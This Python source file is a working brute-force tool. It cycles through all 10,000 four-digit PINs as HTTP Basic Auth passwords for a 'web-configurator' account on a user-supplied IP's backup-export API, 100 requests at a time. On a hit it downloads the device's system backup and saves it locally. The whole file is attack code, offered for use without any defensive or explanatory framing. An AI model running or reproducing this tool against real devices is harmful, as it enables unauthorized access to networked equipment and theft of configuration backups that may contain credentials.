import sys
import os
import asyncio
import aiohttp
from rich.console import Console
from rich.progress import (
    Progress,
    SpinnerColumn,
    BarColumn,
    MofNCompleteColumn,
    TextColumn,
    TimeElapsedColumn,
    TimeRemainingColumn,
)

CONCURRENCY = 100
TOTAL_PINS  = 10000
TIMEOUT     = 15

async def try_pin(ip, pin, session, sem, found_event, state, progress, task_id):
    async with sem:
        if found_event.is_set():
            return
        url = f"http://{ip}/api/system/backup/export"
        try:
            async with session.get(
                url,
                auth=aiohttp.BasicAuth('web-configurator', pin),
                timeout=TIMEOUT
            ) as resp:
                if resp.status == 200:
                    content = await resp.read()
                    state['pin']     = pin
                    state['content'] = content
                    found_event.set()
        except aiohttp.ClientError as e:
            state['error'] = True
            state['exc']   = e
            found_event.set()
        finally:
            progress.update(task_id, advance=1, pin=pin)

async def main():
    console = Console()
    ip = console.input("[bold cyan]Enter target IP address (e.g. 192.168.1.100): [/]")
    if not ip:
        console.print("[red]No IP provided, exiting.[/]")
        sys.exit(1)

    console.print("[green]Brute-forcing 4-digit PINs (0000–9999)…[/]")

    sem         = asyncio.Semaphore(CONCURRENCY)
    found_event = asyncio.Event()
    state       = {'pin': None, 'content': None, 'error': False, 'exc': None}

    async with aiohttp.ClientSession() as session:
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            MofNCompleteColumn(),
            TextColumn("PIN: [yellow]{task.fields[pin]}"),
            TimeElapsedColumn(),
            TimeRemainingColumn(),
            console=console,
            refresh_per_second=5,
        ) as progress:
            task_id = progress.add_task(
                "[white]Trying…[/]",
                total=TOTAL_PINS,
                pin="----"
            )

            tasks = [
                asyncio.create_task(
                    try_pin(ip, f"{i:04d}", session, sem, found_event, state, progress, task_id)
                )
                for i in range(TOTAL_PINS)
            ]

            await found_event.wait()
            for t in tasks:
                t.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)

    if state['error']:
        console.print(f"[red]Network error during brute-force:[/] {state['exc']}")
        sys.exit(1)
    if not state['pin']:
        console.print("[bold red]❌ No valid PIN found in range 0000–9999.[/]")
        sys.exit(1)

    console.print(f"[bold green]✔ Success! PIN found:[/] [yellow]{state['pin']}[/]")

    script_dir = os.path.dirname(os.path.abspath(__file__))
    filename   = f"{ip}.backup"
    save_path  = os.path.join(script_dir, filename)

    try:
        with open(save_path, "wb") as f:
            f.write(state['content'])
    except IOError as ioe:
        console.print(f"[red]Failed to write file:[/] {ioe}")
        sys.exit(1)

    console.print(f"[bold green]✔ Backup saved to:[/] [yellow]{save_path}[/]")

if __name__ == "__main__":
    if sys.platform.startswith("win"):
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    asyncio.run(main())
